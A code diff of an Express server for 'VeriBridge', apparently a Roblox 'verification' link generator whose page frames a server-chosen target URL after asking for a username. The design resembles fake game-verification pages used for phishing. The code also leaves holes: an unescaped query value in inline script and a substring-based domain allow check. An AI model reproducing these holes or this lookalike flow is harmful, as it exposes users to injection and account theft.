@@ -1,6 +1,8 @@
 const express = require('express');
 const cors = require('cors');
 const cookieParser = require('cookie-parser');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 
@@ -56,7 +58,6 @@ app.post('/api/generate', (req, res) => {
         return res.status(400).json({ error: 'No URL provided', success: false });
     }
     
-    // Simple domain validation
     let domainValid = false;
     for (const domain of ALLOWED_DOMAINS) {
         if (url.includes(domain)) {
@@ -159,7 +160,8 @@ app.post('/admin/api/logout', (req, res) => {
     res.json({ success: true });
 });
 
-// ==================== ADMIN LOGIN PAGE ====================
+// ==================== ADMIN PAGES ====================
+
 app.get('/admin', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -203,7 +205,6 @@ app.get('/admin', (req, res) => {
     `);
 });
 
-// ==================== ADMIN DASHBOARD ====================
 app.get('/admin/dashboard', isAuthenticated, (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -358,6 +359,7 @@ app.get('/gen', (req, res) => {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VeriBridge Gen</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -430,55 +432,37 @@ app.get('/gen', (req, res) => {
     `);
 });
 
-// ==================== VERIFICATION PAGE ====================
+// ==================== VERIFICATION PAGE - YOUR BEAUTIFUL VERSION ====================
 app.get('/verify.html', (req, res) => {
     const code = req.query.code;
+    
     if (!code) {
         res.send('<h1>Invalid link</h1><a href="/gen">Go to Generator</a>');
         return;
     }
-    res.send(`
+    
+    // Read your beautiful verify.html file
+    const verifyHtmlPath = path.join(__dirname, '../public/verify.html');
+    
+    if (fs.existsSync(verifyHtmlPath)) {
+        // Use your existing verify.html file
+        let html = fs.readFileSync(verifyHtmlPath, 'utf8');
+        // The code is already handled in your HTML via URL parameter
+        res.send(html);
+    } else {
+        // Fallback if file doesn't exist - but you have it!
+        res.send(`
 <!DOCTYPE html>
 <html>
-<head>
-    <title>VeriBridge | Verification</title>
-    <style>
-        body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
-        .container{text-align:center;background:rgba(0,0,0,0.3);padding:40px;border-radius:20px;border:1px solid cyan}
-        input,button{padding:12px;margin:10px;border-radius:10px;border:none}
-        input{background:#1a1a2e;color:white;width:250px}
-        button{background:cyan;color:black;font-weight:bold;cursor:pointer}
-        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:none}
-        .frame-card{width:90%;max-width:500px;background:white;margin:60px auto;border-radius:20px;overflow:hidden}
-        .frame-header{background:#2c5a7a;padding:15px;color:white;display:flex;justify-content:space-between}
-        .close-btn{background:red;color:white;border:none;padding:5px 15px;border-radius:10px;cursor:pointer}
-        iframe{width:100%;height:500px;border:none}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>VeriBridge</h1>
-        <p>Roblox Verification</p>
-        <input type="text" id="username" placeholder="Enter Roblox username">
-        <br>
-        <button onclick="startVerification()">Start Verification</button>
-    </div>
-    <div id="frameOverlay" class="frame-overlay">
-        <div class="frame-card">
-            <div class="frame-header"><span>Verification Required</span><button class="close-btn" onclick="closeFrame()">Close</button></div>
-            <iframe id="verificationFrame" src="about:blank"></iframe>
-        </div>
-    </div>
-    <script>
-        let TARGET_URL = 'https://www.roblox.com';
-        fetch('/api/link/${code}').then(res=>res.json()).then(data=>{if(data.success&&data.targetUrl)TARGET_URL=data.targetUrl});
-        function startVerification(){const u=document.getElementById('username').value;if(!u||u.length<3){alert('Enter valid username');return}localStorage.setItem('veribridge_user',u);document.getElementById('verificationFrame').src=TARGET_URL;document.getElementById('frameOverlay').style.display='flex'}
-        function closeFrame(){document.getElementById('frameOverlay').style.display='none';document.getElementById('verificationFrame').src='about:blank'}
-        const s=localStorage.getItem('veribridge_user');if(s)document.getElementById('username').value=s;
-    </script>
+<head><title>VeriBridge</title></head>
+<body style="background:#0a0f1e;color:white;text-align:center;padding:50px">
+    <h1>⚠️ verify.html not found</h1>
+    <p>Please upload your verify.html file to the /public folder</p>
+    <a href="/gen">Go to Generator</a>
 </body>
 </html>
-    `);
+        `);
+    }
 });
 
 // ==================== ROOT REDIRECT ====================
